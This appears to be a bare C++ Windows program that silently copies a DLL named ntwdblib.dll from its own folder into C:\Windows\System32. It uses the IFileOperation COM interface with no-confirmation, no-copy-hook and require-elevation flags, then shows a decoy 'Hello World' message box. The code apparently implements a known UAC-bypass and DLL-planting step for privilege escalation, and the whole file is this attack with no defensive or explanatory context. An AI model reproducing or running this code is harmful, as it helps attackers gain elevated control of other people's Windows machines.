#include <Shobjidl.h>
#include <string>

int WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	HMODULE hModule = NULL;
	LPCWSTR dllName = L"ntwdblib.dll";
	IFileOperation *fileOperation = NULL;
	wchar_t dllPath[1024];
	GetModuleFileName(hModule, dllPath, 1024);
	std::wstring path(dllPath);
	const size_t last = path.rfind('\\');
	if (std::wstring::npos != last)
	{
		path = path.substr(0, last + 1);
	}
	path += dllName;
	LPCWSTR destPath = L"C:\\windows\\System32";
	HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
	if (SUCCEEDED(hr)) {
		hr = CoCreateInstance(CLSID_FileOperation, NULL, CLSCTX_ALL, IID_PPV_ARGS(&fileOperation));
		if (SUCCEEDED(hr)) {
			hr = fileOperation->SetOperationFlags(
				FOF_NOCONFIRMATION |
				FOF_SILENT |
				FOFX_SHOWELEVATIONPROMPT |
				FOFX_NOCOPYHOOKS |
				FOFX_REQUIREELEVATION |
				FOF_NOERRORUI);
			if (SUCCEEDED(hr)) {
				IShellItem *from = NULL, *to = NULL;
				hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
				if (SUCCEEDED(hr)) {
					if (destPath)
						hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
					if (SUCCEEDED(hr)) {
						hr = fileOperation->CopyItem(from, to, dllName, NULL);
						if (NULL != to)
							to->Release();
					}
					from->Release();
				}
				if (SUCCEEDED(hr)) {
					hr = fileOperation->PerformOperations();
				}
			}
			fileOperation->Release();
		}
		CoUninitialize();
	}
	MessageBoxA(0, "Hello World", "Hello World", 0);
	return 0;
}
